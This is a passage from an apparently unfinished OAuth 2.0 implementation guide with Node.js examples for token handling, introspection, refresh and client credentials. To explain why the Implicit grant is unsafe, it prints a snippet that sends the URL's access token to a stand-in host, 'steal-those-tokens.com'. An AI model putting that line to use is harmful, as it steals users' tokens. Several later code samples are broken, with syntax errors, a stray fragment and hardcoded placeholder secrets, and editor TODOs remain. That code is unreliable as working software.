
function restoreCodeVerifier(req) {
  return req.session.oauthCode; // Server-side session
}

function restoreNonce(req) {
  return req.session.oauthNonce; // Server-side session
}

module.exports = app;
```

`common.parseJWT` abstracts the JWT parsing and verification out. In this case it expects public keys to be published in JWKs format at a well known location, and verifies the audience, issuer and expiration, as well as the signature.

```javascript
const axios = require('axios');
const FormData = require('form-data');
const config = require('./config');
const { promisify } = require('util');

const common = {};

const jwksUri = 'https://login.twgtl.com/.well-known/jwks.json';

const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');
const client = jwksClient({
  strictSsl: true, // Default value
  jwksUri: jwksUri,
  requestHeaders: {}, // Optional
  requestAgentOptions: {}, // Optional
  timeout: 30000, // Defaults to 30s
});

common.parseJWT = async (unverifiedToken, nonce) => {
  const parsedJWT = jwt.decode(unverifiedToken, {complete: true});
  const getSigningKey = promisify(client.getSigningKey).bind(client);
  let signingKey = await getSigningKey(parsedJWT.header.kid);
  let publicKey = signingKey.getPublicKey();
  try {
    const token = jwt.verify(unverifiedToken, publicKey, { audience: config.clientId, issuer: config.issuer });
    if (nonce) {
      if (nonce !== token.nonce) {
        console.log("nonce doesn't match "+nonce +", "+token.nonce);
        return null;
      }
    }
    return token;
  } catch(err) {
    console.log(err);
    throw err;
  }
}

//...

module.exports = common;

```

At this point, we are completely finished with OAuth. We've successfully exchanged the authorization code for tokens, which is the last step of the OAuth authorization code grant.

Let's take a quick look at the 3 `restore` functions from above and how they are implemented for cookies and encrypted cookies. Here is how those functions would be implemented if we were storing the values in cookies:

```javascript
function restoreState(req, res) {
  const value = req.cookies.oauth_state;
  res.clearCookie('oauth_state');
  return value;
}

function restoreCodeVerifier(req, res) {
  const value = req.cookies.oauth_code_verifier;
  res.clearCookie('oauth_code_verifier');
  return value;
}

function restoreNonce(req, res) {
  const value = req.cookies.oauth_nonce;
  res.clearCookie('oauth_nonce');
  return value;
}
```

And here is the code that decrypts the encrypted cookies:

```javascript
const password = 'setec-astronomy'
const key = crypto.scryptSync(password, 'salt', 24);

function decrypt(value) {
  const parts = value.split(':');
  const cipherText = parts[0];
  const iv = Buffer.from(parts[1], 'hex');
  const decipher = crypto.createDecipheriv('aes-192-cbc', key, iv);
  let decrypted = decipher.update(cipherText, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function restoreState(req, res) {
  const value = decrypt(req.cookies.oauth_state);
  res.clearCookie('oauth_state');
  return value;
}

function restoreCodeVerifier(req, res) {
  const value = decrypt(req.cookies.oauth_code_verifier);
  res.clearCookie('oauth_code_verifier');
  return value;
}

function restoreNonce(req, res) {
  const value = decrypt(req.cookies.oauth_nonce);
  res.clearCookie('oauth_nonce');
  return value;
}
```

#### Tokens

Now that we've successfully exchanged the authorization `code` for tokens, let's look at the tokens we received from the OAuth server. We are going to assume that the OAuth server is using JWTs (JSON Web Tokens) for the access and ID tokens. OAuth2 doesn't define any token format, but in practice access tokens are often JWTs. OIDC, on the other hand, requires the `id_token` to be a JWT. Most modern OAuth servers use JWTs, so this is a safe assumption. 

Here are the tokens we have:

* `access_token`: This is a JWT that contains information about the user including their id, permissions, and anything else we might need from the OAuth server.
* `id_token`: This is a JWT that contains public information about the user such as their name. This token is usually safe to store in non-secure cookies or local storage because it can't be used to call APIs on behalf of the user.
* `refresh_token`: This is an opaque token (not a JWT) that can be used to create new access tokens. Access tokens expire and might need to be renewed, depending on your requirements (for example how long you want access tokens to last versus how long you want users to stay logged in).

Since 2 of the tokens we have are JWTs, let's quickly cover that technology here. A full coverage of JWTs is outside of the scope of this guide, but there are a couple of good guides in our [Expert Advice Token section](/learn/expert-advice/tokens/) about JWTs. There are two salient points worth reiterating:

* To securely use a token, make sure it is signed and verify additional claims, such as the issuer (who created it) and audience (who the token is for), are values you expect.
* JWTs expire, but until then they are typically useable by anything that has access to them, as they are usually bearer tokens. Keep their lifetimes short and protect them as you would other valuabel information like an API key.

JWTs are JSON objects that contain information about users and can also be signed. The act of signing allows the JWT to be verified to ensure it hasn't been tampered with. JWTs have a couple of standard claims that impact their use. These claims are:

* `aud`: The intended audience of the JWT. This is usually an application id and your applications should verify this value.
* `exp`: The expiration instant of the JWT. This is stored as the number of seconds since Epoch (January 1, 1970 UTC).
* `iss`: The system that created the JWT. This is normally a value configured in the OAuth server. Your application should verify that this claim is correct.
* `nbf`: The instant after which the JWT is valid. It stands for "not before". This is stored as the number of seconds since Epoch (January 1, 1970 UTC).
* `sub`: The subject of this JWT. Normally, this is the user's id.

JWTs have many other standard claims that you should be aware of. You can review these specifications for a list of the standard claims:

* https://tools.ietf.org/html/rfc7519#section-4
* https://openid.net/specs/openid-connect-core-1_0.html#Claims

#### User and token information

Before we cover how the Authorization code grant is used for each of the OAuth modes, let's discuss two additional OAuth endpoints that can be used to retrieve information about your users and their tokens. These endpoints are:

* Introspection - this endpoint is an extension to the OAuth 2.0 specification and returns information about the token using the standard JWT claims from the previous section.
* UserInfo - this endpoint is defined as part of the OpenID Connect specification and returns information about the user.

These two endpoints are quite different and serve different purposes. Though they might return similar values, the purpose of the introspection endpoint is to return information about the token itself. The UserInfo endpoint is designed to return information about the user. Both of these endpoints contain the same information as in the respective JWTs, but you can avoid parsing the JWTs if you use them; the cost is a network request.

Both endpoints are simple to use, so let's look at some code for each. 

First, let's look at using the introspect endpoint to get information about an access token. We can use the information returned from this endpoint to ensure that the access token is still valid or get information such as the standard JWT claims we covered in the previous section. Besides returning the JWT claims, this endpoint also returns a few additional claims that you can leverage in your app. These additional claims are:

* `active`: Determines if the token is still active and valid.
* `scope`: The list of scopes that were passed to the OAuth server during the login process and subsequently used to create the token.
* `client_id`: The `client_id` value that was passed to the OAuth server during the login process.
* `username`: The username of the user. This is likely the username they logged in with but could be something different.
* `token_type`: The type of the token. Usually, this is `Bearer` meaning that the token belongs to and describes the user that is in control of it.

Let's write a function that uses the introspect endpoint to determine if the access token is still valid. This is an alternative to parsing the JWT locally. If you want to keep your JWT logic to a minimum, you can defer to this endpoint; the tradeoff is that you'll be making a network call. This code will leverage FusionAuth's introspect endpoint, which again is always at a well-defined location:

```javascript
common.validateToken = async function (accessToken, clientId) {

  const form = new FormData();
  form.append('token', accessToken);
  form.append('client_id', clientId); // FusionAuth requires this for authentication

  try {
    const response = await axios.post('https://login.twgtl.com/oauth2/introspect', form, { headers: form.getHeaders() });
    if (response.status === 200) {
      return response.data.active;
    }
  } catch (err) {
    console.log(err);
  }

  return false;
}
```

This function makes a request to the introspect endpoint and then uses the response status code and JSON to determine if the token is valid. This is helpful if we are looking to validate tokens. You can't defer all validation to the introspect endpoint, however. The consumer of the access token should also validate the `aud` and `iss` claims are as expected.

If we need to get additional information about the user from the OAuth server, we can leverage the UserInfo endpoint. This endpoint takes the access token and returns a number of well defined claims about the user. Technically, this endpoint is part of the OpenID Connect specification, but most OAuth servers implement it, so you'll likely be safe using it. Here are the claims that are returned by standard the UserInfo endpoint:

* `sub`: The unique identifier for the user.
* `name`: The user's full name. 
* `given_name`: The user's first name.
* `family_name`: The user's last name.
* `middle_name`: The user's middle name.
* `nickname`: The user's nickname (i.e. Joe for Joseph).
* `preferred_username`: The user's preferred username that they are using with your application.
* `profile`: A URL that points to the user's profile page.
* `picture`: A URL that points to an image that is the profile picture of the user.
* `website`: A URL that points to the user's website (i.e. their blog).
* `email`: The user's email address.
* `email_verified`: A boolean that determines if the user's email address has been verified.
* `gender`: A string describing the user's gender.
* `birthdate`: The user's birthdate as an ISO 8601:2004 YYYY-MM-DD formated string.
* `zoneinfo`: The timezone that the user is in.
* `locale`: The user's preferred locale as an ISO 639-1 Alpha-2 language code in lowercase and an ISO 3166-1 Alpha-2 [ISO3166‑1] country code in uppercase, separated by a dash.
* `phone_number`: The user's telephone number.
* `phone_number_verified`: A boolean that determines if the user's phone number has been verified.
* `address`: A JSON object that contains the user's address information. The sub-claims are:
    * `formatted`: The user's address as a fully formatted string. 
    * `street_address`: The user's street address component.
    * `locality`: The user's city.
    * `region`: The user's state, province, or regin.
    * `postal_code`: The user's postal code or zipcode.
    * `country`: The user's country.
* `updated_at`: The instant that the user's profile was last updated as a number representing the number of seconds from Epoch UTC.

Not all of these claims will be present, however. What is returned depends on the scopes requested in the initial authorization request as well as the configuration of the OAuth server. The `sub` claim will always be present. See the [OIDC spec](https://openid.net/specs/openid-connect-core-1_0.html#ScopeClaims) as well as your OAuth server's documentation for the proper scopes and returned claims.

Here's a function that we can use to retrieve a user object from the UserInfo endpoint. This is equivalent to parsing the `id_token` and looking at claims embedded there. 

```javascript

common.retrieveUser = async function (accessToken) {
  const response = await axios.get('https://login.twgtl.com/oauth2/userinfo', { headers: { 'Authorization' : 'Bearer ' + accessToken } });
  try {
    if (response.status === 200) {
      return response.data;
    }

    return null;
  } catch (err) {
    console.log(err);
  }
  return null;
}
```

#### Local login and registration with the Authorization Code grant

Now that we have covered the Authorization Code grant in detail, let's look at next steps for our application code. 

**In other words, your application has these tokens, now what the heck do you do with them?**

If you are implementing the **Local login and registration** mode, then your application is using OAuth to log users in. This means that after the OAuth workflow is complete, the user should be logged in and the browser should be redirected to your application.

For our example TWGTL application, we want to send the user to their ToDo list after they have logged in. In order to log the user into the TWGTL application, we need to create them a session of some sort. There are two ways to handle this:

* Cookies
* Server-side sessions

Which of these methods is best depends on your requirements, but both work well in practice and are both secure if done correctly. If you recall from above, we put a placeholder function call in our code just after we received the tokens from the OAuth server. Let's fill in that code for the `handleTokens` function for each of the session options above.

First, let's store the tokens as cookies in the browser and redirect the user to their ToDos. Here's some code that accomplishes that:

```javascript
function handleTokens(accessToken, idToken, refreshToken) {
  // Write the tokens as cookies
  res.cookie('access_token', accessToken, {httpOnly: true, secure: true});
  res.cookie('id_token', idToken); // Not httpOnly or secure
  res.cookie('refresh_token', refreshToken, {httpOnly: true, secure: true});

  // Redirect to the To-do list
  res.redirect('/todos', 302);
}
```

At this point, the application backend has redirected the browser to the user's ToDo list. It has also sent the access token, ID token, and refresh tokens back to the browser as cookies. The browser will now send these cookies to the backend each time it makes a request. These requests could be for JSON APIs or standard HTTP requests (i.e. `GET` or `POST`). The beauty of this solution is that our application knows the user is logged in because these cookies exist. We don't have to manage them at all since the browser does it all for us.

These cookies also act as our session. Once the cookies disappear or become invalid, our application knows that the user is no longer logged in. Let's take a look at how we use these tokens for an API that the browser will call via AJAX. You can also have server side, non API html generated based on the `access_token` claims.

This API is used to retrieve the user's ToDos from the database. The key here is that we will assume that the OAuth server we are using creates JWTs (JSON Web Tokens) for the access token.

```javascript
authorizationCheck = async (req, res) => {
  const accessToken = req.cookies.access_token;
  const refreshToken = req.cookies.refresh_token;
  try { 
    let jwt = await common.parseJWT(accessToken);
    return true;
  } catch (err) {
    console.log(err);
    return false;
  }
}

router.get('/api', (req, res, next) => {
  authorizationCheck(req, res).then((authorized) => {
    if (!authorized) {
      res.sendStatus(403);
      return;
    }

    const todos = getTodos(); // get the todos from the database
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify(todos));
  }).catch((err) => {
    console.log(err);
  });
});
```

The interesting code is `authorizationCheck` which parses the `access_token` which is pulled from the cookie and performs the same verifications as before. 

This can be called like so:

```html
// assumes fetch is available
fetch('http://localhost:3000/todos/api') // XXX need to reverse this, because /todos/api is ugly and we should use /api/todos
  .then(response => response.json())
  .then(data => console.log(data));
```

Because cookies are automatically sent by the browser, the API call is authorized as long as the cookies are valid.

Next, let's look at the alternative implementation. We'll create a server-side session and store all of the tokens there. This method also writes a cookie back to the browser, but this cookie only stores the session id and nothing else. This session id allows our server-side code to lookup the user's session during each request. Sessions are generally handled by the framework you are using, so we won't go into details here. You can read up more on server-side sessions on the web if you are interested.

Here's the code that creates a server-side session and redirects the user to their ToDo list:

```javascript
var expressSession = require('express-session');
app.use(expressSession({resave: false, saveUninitialized: false, secret: 'setec-astronomy'}));

function handleTokens(accessToken, idToken, refreshToken) {
  // Store the tokens in the session
  req.session.accessToken = accessToken;
  req.session.idToken = idToken;
  req.session.refreshToken = refreshToken;

  // Redirect to the To-do list
  res.redirect('/todos', 302);
}
```

This code stores the tokens in the server-side session and redirects the user. Now, each time the browser makes a request to the TWGTL backend, we can access these tokens from the session.

Let's update our API code from above to use the server side sessions instead of the cookies:

```javascript
authorizationCheck = async (req, res) => {
  const accessToken = req.session.accessToken;
  const refreshToken = req.session.refreshToken;
  try { 
    let jwt = await common.parseJWT(accessToken);
    return true;
  } catch (err) {
    console.log(err);
    return false;
  }
}

router.get('/api', (req, res, next) => {
  authorizationCheck(req, res).then((authorized) => {
    if (!authorized) {
      res.sendStatus(403);
      return;
    }

    const todos = getTodos(); // get the todos from the database
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify(todos));
  }).catch((err) => {
    console.log(err);
  });
});
```

The only difference is where `authorizationCheck` pulls the access token from. Everything else is exactly the same.

Finally, we need to update our code to handle refreshing and updating the access token. The best place for that is in the `authorizationCheck` code. Here's the updated code:

```javascript
authorizationCheck = async (req, res) => {
  const accessToken = req.cookies.access_token;
  const refreshToken = req.cookies.refresh_token;
  try {
    let jwt = await common.parseJWT(accessToken);
    return true;
  } catch (err) {
    if (err.name === "TokenExpiredError") {
      const refreshedTokens = await common.refreshJWTs(refreshToken);

      const newAccessToken = refreshedTokens.accessToken;
      const newIdToken = refreshedTokens.idToken;

      // update our cookies
      console.log("updating our cookies");
      res.cookie('access_token', newAccessToken, {httpOnly: true, secure: true});
      res.cookie('id_token', newIdToken); // Not httpOnly or secure

      // subsequent parts of processing this request may pull from cookies, so if we refreshed, update them
      req.cookies.access_token = newAccessToken;
      req.cookies.id_token = newIdToken;

      try {
        let newJwt = await common.parseJWT(newAccessToken);
        return true;
      } catch (err2) {
        console.log(err2);
        return false;
      }
    } else {
      console.log(err);
    }
    return false;
  }
}
```

If, in parsing our access token, we see a `TokenExpiredError`, this code attempts to refresh the JWT. If the JWT is malformed, the new JWT is malformed, or if the refresh fails, then the refresh token may have been revoked and the code will deny access. This authorization code is perfect for extracting to a middleware.

Here's `refreshJWTs` code, which actually performs the JWT refresh:

```javascript
common.refreshJWTs = async (refreshToken) => {
  console.log("refreshing.");
  // POST refresh request to Token endpoint
  const form = new FormData();
  form.append('client_id', clientId);
  form.append('grant_type', 'refresh_token');
  form.append('refresh_token', refreshToken);
  const authValue = 'Basic ' + Buffer.from(clientId +":"+clientSecret).toString('base64');
  const response = await axios.post('https://login.twgtl.com/oauth2/token', form, {
      headers: {
         'Authorization' : authValue,
         ...form.getHeaders()
      } });

  const accessToken = response.data.access_token;
  const idToken = response.data.id_token;
  const refreshedTokens = {};
  refreshedTokens.accessToken = accessToken;
  refreshedTokens.idToken = idToken;
  return refreshedTokens;

}
```

By default, FusionAuth requires authenticated requests to the refresh token endpoint. In this case, the `authValue` string is a correctly formatted authentication request.

#### Third-party login and registration (also Enterprise login and registration) with the Authorization Code grant

In the previous section we covered the **Local login and registration** process where the user is logging into our TWGTL application using an OAuth server we control such as FusionAuth. The other method that users can login is using a third-party such as Facebook or an Enterprise system such as Active Directory. This process uses OAuth in the same way we described above.

Some third-party providers have hidden some of the complexity from us by providing simple JavaScript libraries that handle the entire OAuth workflow (Facebook for example). We won't cover these types of third-party systems and instead focus on traditional OAuth workflows.

In most cases, the third-party OAuth server is acting the same as our local OAuth server and in the end, the result is that we receive tokens that we can use to make API calls with the third-party. Let's update our `handleTokens` code to call an fictitious API to retrieve the user's friend list from the third party.

```javascript
const axios = require('axios');
const FormData = require('form-data');
var expressSession = require('express-session');
app.use(expressSession({resave: false, saveUninitialized: false, secret: 'setec-astronomy'}));

//...

function handleTokens(accessToken, idToken, refreshToken) {
  // Store the tokens in the session
  req.session.accessToken = accessToken;
  req.session.idToken = idToken;
  req.session.refreshToken = refreshToken;

  // Call the third-party API
  axios.post('https://api.third-party-provider.com/profile/friends', form, { headers: { 'Authorization' : 'Bearer '+accessToken } })
    .then((response) => { 
      if (response.status == 200) {
        const json = JSON.parse(response.data);
        req.session.friends = json.friends;

        // Optionally store the friends list in our database
        storeFriends(req, json.friends);
      }
    });

  // Redirect to the To-do list
  res.redirect('/todos', 302);
}
```

This is an example of using the access token we received from the third-party OAuth server to call an API. 

If you are implementing the **Third-party login and registration** mode without leveraging an OAuth server like FusionAuth, there are a couple of things to consider:

* Do you want your sessions to be the same duration as the third-party system?
    * In most cases, if you implement **Third-party login and registration** as we have outlined, your users will be logged into your application for as long as the access and refresh tokens from the third-party system are valid.
    * You can change this behavior by setting timeouts on the cookies or server-side sessions you create to store the tokens.
* Do you need to reconcile the user's information and store it in your own database?
    * You might need to leverage an API in the third-party system to fetch the user's information and store it in your database. This is out of scope of this guide, but something to consider.

If you use a OAuth server such as FusionAuth to manage your users and provide **Local login and registration**, it will often handle both of these items for you with little configuration and no additional coding.

#### Third-party authorization with the Authorization Code grant

The last mode we will cover as part of the authorization code grant workflow is the **Third-party authorization** mode. This mode is the same as those above, but it requires slightly different handling of the tokens. Typically with this mode, the tokens we receive from the third-party need to be stored in our database. Doing so allows us to use them whenever we need to.

In our example, we wanted to leverage the WUPHF API to send a WUPHF when the user completes a ToDo. In order to accomplish this, we need to store the access and refresh tokens we received from WUPHF in our database. Then when the user completes a ToDo, we can send the WUPHF.

First, let's update the `handleTokens` function to store the tokens in the database:

```javascript
function handleTokens(accessToken, idToken, refreshToken) {
  // ... 

  // Save the tokens to the database
  storeTokens(accessToken, refreshToken);

  // ... 
}
```

Now the tokens are safely stored in our database, we can retrieve them in our complete ToDo API endpoint and send the WUPHF. Here is some pseudo-code that implements this feature:

```javascript
const axios = require('axios');

// This is invoked like: https://app.twgtl.com/api/todos/complete/42
router.post('/api/todos/complete/:id', function(req, res, next) {
  common.authorizationCheck(req, res).then((authorized) => {
    if (!authorized) {
      res.sendStatus(403);
      return;
    }

    // First, complete the ToDo by id
    const idToUpdate = parseInt(req.params.id);
    common.completeTodo(idToUpdate);
  
    // Next, load the access and refresh token from the database
    const wuphfTokens = loadWUPHFTokens(user);
  
    // Finally, call the API
    axios.post('https://api.wuphf.com/send', {}, { 
          headers: {
            auth: { 'bearer': wuphfTokens.accessToken, 'refresh': wuphfTokens.refreshToken }
          }
        }).then((response) => {
          // check for status, log if not 200
        }
      );
    });
    
    // return all the todos
    const todos = common.getTodos();
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify(todos));
  });
});
```

This code is just an example of how we might leverage the access and refresh tokens to call third-party APIs on behalf of the user.

### Implicit grant

The next grant that is defined in the OAuth 2.0 specification is the Implicit grant. Normally, we would cover this grant in detail the same way we covered the Authorization code grant. Except, I'm not going to. :)

The reason we won't cover the Implicit grant in detail is that it is horribly insecure, broken, deprecated, and should never, ever be used (ever). Okay, maybe that's being a bit dramatic, but please don't use this grant. 

Instead of showing you how to use it, let's discuss why.

The Implicit grant has been removed from OAuth as of the most recent version of the OAuth 2.1 specification. The reason that it has been removed is that it skips an important step that allows you to secure the tokens you receive from the OAuth server. This step occurs when your application backend makes the call to the Token endpoint to retrieve the tokens.

Unlike the Authorization Code Grant, the Implicit Grant does not redirect the browser back to your application backend with an Authorization Code. Instead, it puts the access token directly on the URL as part of the redirect. These URLs look like this:

`https://my-app.com/#token-goes-here`

The token is added to the redirect URL after the `#` symbol, which means it is technically the fragment portion of the URL. What this means is that wherever the OAuth server redirects the browser to, the access token is accessible to basically everyone. 

Specifically, the access token is accessible to any and all JavaScript that is running in the browser (including plugins). Since this token allows the browser to make API calls and web requests on behalf of the user, having this token be accessible to third-party code is extremely dangerous.

Let's take a dummy example of a single-page web application that uses the Implicit grant:

```html
// This is dummy code for a SPA that uses the access token
<html>
<head>
  <script type="text/javascript" src="/my-spa-code-1.0.0.js"></script>
  <script type="text/javascript" src="https://some-third-party-server.com/a-library-found-online-that-looked-cool-0.42.0.js"></script>
</head>
<body>
...
</body>
```

This HTML includes 2 JavaScript libraries:

* The code for the application itself (`my-spa-code-1.0.0.js`)
* A library we found online that did something cool and we just pulled it in (`a-library-found-online-that-looked-cool-0.42.0.js`)

Let's assume that our code is 100% secure and we don't have to worry about it. The issue here is that the library we pulled in is an unknown quantity. It might include other libraries as well. Remember that the DOM is dynamic. Any JavaScript can load any other JavaScript library simply by updating the DOM with more `<script>` tags. Therefore, we have very little chance of ensuring that every other line of code from third-party libraries is secure.

If a third-party library wanted to steal an access token from our dummy application, all it would need to do is run this code:

```javascript
if (window.location.hash.contains('access_token')) {
  fetch('http://steal-those-tokens.com/yummy?hash=' + window.location.hash);
}
```

Three lines of code and the access token has been stolen. As you can see, the risk of leaking tokens is far too high to ever consider using the Implicit grant. This is why we recommend that no one ever use this grant.

If you aren't dissuaded by the above scariness, and you really need to use the Implicit grant, please [check out our documentation](/docs/v1/tech/oauth/#example-implicit-grant), which walks you through how to implement it. 

### Resource Owner's Password Credentials Grant

The next grant on our list is the Resource Owner's Password Credentials Grant. That's a lot of typing, so I'm going to refer to this as the Password Grant for this section.

This grant is also being deprecated and the current recommendation is that it should not be used. Let's discuss how this grant works and why it is being deprecated.

The Password Grant allows an application to collect the username and password directly from the user via a native form and send this information to the OAuth server. The OAuth server verifies this information and then returns an access token and optionally a refresh token.

Many mobile applications and legacy web applications use this grant because they want to present the user with a login UI that feels native to their application. In most cases, mobile applications don't want to open a web browser to log users in and web applications want to keep the user in their UI rather than redirecting the browser to the OAuth server.

There are two main issues with this approach:

1. The application is collecting the username and password and sending it to the OAuth server. This means that the application has ensure that the username and password are completely secure in transit. This differs from the Authorization Code Grant where the username and password are only provided directly to the OAuth server.
1. This grant does not support any of the auxiliary security features that your OAuth server may provide such as:
    * Multi-factor authentication
    * Password resets
    * Device grants
    * Registration
    * Email and account verification
    * Passwordless login

Due to how limiting and insecure this grant is, it has been removed from the latest draft of the OAuth specification and it is recommended to not use it in production.

If you aren't dissuaded by the above issues with this grant, and you have a use case where you really need it, please [check out our documentation](/docs/v1/tech/oauth/#example-resource-owner-password-credentials-grant), which walks you through how to use it. 

### Client Credentials Grant

The Client Credentials Grant provides the ability for one `client` to authorize another `client`. In OAuth terms, a `client` is an application itself, independent of a user. Therefore, this grant is most commonly used to allow one application to use another application, often via APIs. This grant therefore implements the **Machine-to-machine authorization** mode described above.

The Client credentials grant leverages the Token endpoint of the OAuth server and sends in a couple of parameters as form data in order to generate access tokens. These access tokens are then used to call APIs. Here are the parameters needed for this grant:

* `client_id` - this is client id that identifies the source application.
* `client_secret` - this is a secret key that is provided by the OAuth server. This should never be made public and should only ever be stored on the server.
* `grant_type` - this will always be the value `client_credentials` to let the OAuth server know we are using the Client credentials grant.

You can send the `client_id` and `client_secret` in the request body or you can send them in using Basic authorization. We'll send them in the body in the code below to keep things consistent with the code from the Authorization Code grant above.

Let's rework our TWGTL application to use the client credentials grant in order to support two different backends making APIs calls to each other.

If you recall from above, our code that completed a TWGTL ToDo item also sent out a WUPHF. This was all inline but could have been separated out into different backends or microservices. I hear microservices are hot right now. 

Let's update our code to move the WUPHF code into a separate service:

XXX change to use axios

```javascript
router.post('/api/todo/complete/:id', function(req, res, next) {
  // Verify the user is logged in
  const user = authorizeUser(req);

  // First, complete the ToDo by id
  const todo = todoService.complete(req.params.id, user);

  sendWUPHF(todo.title, user.id);
});

function sendWUPHF(title, userId) {
  const accessToken = getAccessToken(); // Coming soon

  request(
    {
      method: 'POST',
      uri: 'https://wuphf-microservice.twgtl.com/send',
      auth: {
        'bearer': accessToken
      },
      body: {
        'title': title,
        'userId': userId
      }
    }
  );
}
```
```javascript
const axios = require('axios');
const axios = require('./common');

router.post('/api/todos/complete/:id', function(req, res, next) {
  common.authorizationCheck(req, res).then((authorized) => {
    if (!authorized) {
      res.sendStatus(403);
      return;
    }

    // First, complete the ToDo by id
    const idToUpdate = parseInt(req.params.id);
    common.completeTodo(idToUpdate);
    const todo = common.getTodo(idToUpdate);
    const user = common.retrieveUser(req.cookies.access_token);
  
    sendWUPHF(todo.task, user.id);

    // return all the todos
    const todos = common.getTodos();
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify(todos));
  });
}

function async sendWUPHF(title, userId, ) {
  const accessToken = getAccessToken(); 
  const body = { 'title': title, 'userId': user.id }
  const result = await axios.post('https://wuphf-microservice.twgtl.com/send', body, { headers : { authorization: { 'bearer': accessToken } } });
}

```
    const wuphfTokens = loadWUPHFTokens(user);
  
  });
});
```


Here is the WUPHF microservice code that receives the access token and title of the WUPHF and sends it out:

```javascript
const express = require('express');
const router = express.Router();
const bearerToken = require('express-bearer-token');
const request = require('request');
const clientId = '9b893c2a-4689-41f8-91e0-aecad306ecb6';
const clientSecret = 'setec-astronomy';

var app = express();

app.use(express.json());
app.use(bearerToken());
app.use(express.urlencoded({extended: false}));

router.post('/send', function(req, res, next) {
  const accessAllowed = verifyAccessToken(req); // Coming soon
  if (!accessAllowed) {
    res.sendStatus(403);
    return;
  }

  // Load the access and refresh token from the database (based on the userId)
  const wuphfTokens = loadWUPHFTokens(req.data.userId);

  // Finally, call the API
  axios.post('https://api.wuphf.com/send', {}, { 
        headers: {
          auth: { 'bearer': wuphfTokens.accessToken, 'refresh': wuphfTokens.refreshToken }
        }
  }).then((response) => {
        res.sendStatus(200);
  }).catch((err) => {
        console.log(err);
        res.sendStatus(500);
  });
});

```

We've now separated the code that is responsible for completing ToDos from the code that sends the WUPHF. The only thing left to do is hook this code up to our OAuth server in order to generate access tokens and verify them.

Because this is machine to machine communication, the user's access tokens are irrelevant. Instead, the Todo API will authenticate against `login.twgtl.com` and receive an access token for its own use. Here's the code that generates the access token using the Client Credentials Grant:

```javascript
const clientId = '82e0135d-a970-4286-b663-2147c17589fd';
const clientSecret = 'setec-astronomy';

function async getAccessToken() {
  // POST request to Token endpoint
  const form = new FormData();
  form.append('client_id', clientId);
  form.append('client_secret', clientSecret)
  form.append('grant_type', 'client_credentials');
  axios.post('https://login.twgtl.com/oauth2/token', form, { headers: form.getHeaders() })
    .then((response) => {
      return response.data.access_token;
    }).catch((err) => {
      console.log(err);
      return null;
    });
}
```

In order to verify the access token in the WUPHF microservice, we will use the `introspect` endpoint that is an extension to the OAuth 2.0 specification. This endpoint takes an access token, verifies it, and then returns any claims associated with the access token. In our case, we are only using this endpoint to ensure the access token is valid. You could also do this by verifying the JWT instead of calling the introspect endpoint.

Here is the code that verifies the access token:

```javascript
const axios = require('axios');
const FormData = require('form-data');

function verifyAccessToken(req) {
  const form = new FormData();
  form.append('token', accessToken);
  form.append('client_id', clientId); 
  try {
    const response = await axios.post('https://login.twgtl.com/oauth2/introspect', form, { headers: form.getHeaders() });
    if (response.status === 200) {
      return response.data.active;
    }
  } catch (err) {
    console.log(err);
    return false;
  }
}
```

With the Client Credentials grant, there is no user to log in. Instead, the clientId and clientSecret act as a username and password, respectively, for the entity trying to obtain an access token. 

### Device Grant

This grant is our final grant to cover. This grant type allows us to use the **Device login and registration** mode. As mentioned above, we cover this mode and the Device Grant in detail in our [OAuth Device Authorization article](/learn/expert-advice/oauth/oauth-device-authorization/).

## Conclusion

I hope this guide has been a useful overview of real-world uses of OAuth 2.0 and provides insights into implementation and the future of the OAuth protocol. Again, you can view working [code in this guide in the accompanying GitHub repository](https://github.com/FusionAuth/fusionauth-example-modern-guide-to-oauth).

If you notice any issues, bugs, or typos, please submit a Github issue or pull request on [this repository](https://github.com/FusionAuth/fusionauth-site).

Thanks for reading and happy coding!





table of contents

implicit grant: implement yummy, ask ouaht server is this real


check the casing of each grant name
Authorization Code
Implicit
Client Credentials

consolidate await/async/callback styles

* Build TOC and rework sections maybe
* Clean up introspect code and discussion
* Test code
* Make diagrams
* Make images

should client call the refresh token endpoint, not the api? probably
